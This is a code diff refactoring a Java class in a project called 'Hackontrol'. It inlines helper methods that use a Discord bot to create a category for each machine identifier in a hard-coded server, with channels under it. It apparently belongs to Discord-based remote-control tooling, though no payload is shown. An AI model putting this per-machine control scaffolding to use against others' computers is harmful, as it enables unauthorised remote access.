@@ -7,7 +7,6 @@ import java.util.List;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
-import com.khopan.hackontrol.errorhandling.ErrorHandler;
 import com.khopan.hackontrol.logger.HackontrolLoggerConfig;
 import com.khopan.hackontrol.manager.Manager;
 import com.khopan.hackontrol.registration.ChannelRegistry;
@@ -15,13 +14,15 @@ import com.khopan.hackontrol.registration.ManagerRegistry;
 import com.khopan.hackontrol.registry.RegistrationHandler;
 import com.khopan.hackontrol.registry.RegistryType;
 import com.khopan.hackontrol.registry.implementation.StrictClassValueOnlyRegistryImplementation;
-import com.khopan.hackontrol.utils.DiscordUtils;
+import com.khopan.hackontrol.utils.ErrorHandler;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
 import net.dv8tion.jda.api.entities.Guild;
+import net.dv8tion.jda.api.entities.MessageHistory;
 import net.dv8tion.jda.api.entities.channel.concrete.Category;
 import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
+import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
 import net.dv8tion.jda.api.requests.GatewayIntent;
 
 public class Hackontrol {
@@ -70,8 +71,7 @@ public class Hackontrol {
 		JDABuilder builder = JDABuilder.createDefault(Token.BOT_TOKEN).enableIntents(GatewayIntent.MESSAGE_CONTENT);
 
 		for(int i = 0; i < this.managerList.size(); i++) {
-			Manager manager = this.managerList.get(i);
-			manager.configureBuilder(builder);
+			this.managerList.get(i).configureBuilder(builder);
 		}
 
 		this.bot = builder.build();
@@ -84,17 +84,17 @@ public class Hackontrol {
 
 		this.guild = this.bot.getGuildById(1173967259304198154L);
 		this.machineIdentifier = Machine.getIdentifier();
-		this.category = DiscordUtils.getOrCreateCategory(this.guild, this.machineIdentifier);
+		this.category = this.getOrCreateCategory(this.guild, this.machineIdentifier);
 
 		for(int i = 0; i < this.channelList.size(); i++) {
 			HackontrolChannel channel = this.channelList.get(i);
-			TextChannel textChannel = DiscordUtils.getOrCreateTextChannelInCategory(this.category, channel.getName());
+			TextChannel textChannel = this.getOrCreateTextChannelInCategory(this.category, channel.getName());
 			channel.hackontrol = this;
 			channel.category = this.category;
 			channel.channel = textChannel;
 			channel.preInitialize(this.registrationHandler.createRegistry(channel));
 
-			if(DiscordUtils.isChannelEmpty(textChannel)) {
+			if(this.isChannelEmpty(textChannel)) {
 				Hackontrol.LOGGER.info("Channel #{} empty", textChannel.getName());
 				channel.initialize();
 			}
@@ -107,6 +107,43 @@ public class Hackontrol {
 			Hackontrol.LOGGER.info("Initializing manager: {}", manager.getClass().getName());
 			manager.initialize(this.registrationHandler);
 		}
+	}
+
+	private Category getOrCreateCategory(Guild guild, String name) {
+		List<Category> list = guild.getCategoriesByName(name, true);
+
+		if(list.isEmpty()) {
+			return guild.createCategory(name).complete();
+		}
+
+		return list.get(0);
+	}
+
+	private TextChannel getOrCreateTextChannelInCategory(Category category, String name) {
+		List<TextChannel> list = category.getTextChannels();
+		boolean hasChannel = false;
+		TextChannel targetChannel = null;
+
+		for(int i = 0; i < list.size(); i++) {
+			TextChannel channel = list.get(i);
+
+			if(channel.getName().equalsIgnoreCase(name)) {
+				hasChannel = true;
+				targetChannel = channel;
+				break;
+			}
+		}
+
+		if(hasChannel) {
+			return targetChannel;
+		}
+
+		return category.createTextChannel(name).complete();
+	}
+
+	private boolean isChannelEmpty(MessageChannel channel) {
+		MessageHistory history = MessageHistory.getHistoryFromBeginning(channel).complete();
+		return history.getRetrievedHistory().isEmpty();
 	}
 
 	private void handleError(Thread thread, Throwable Errors) {
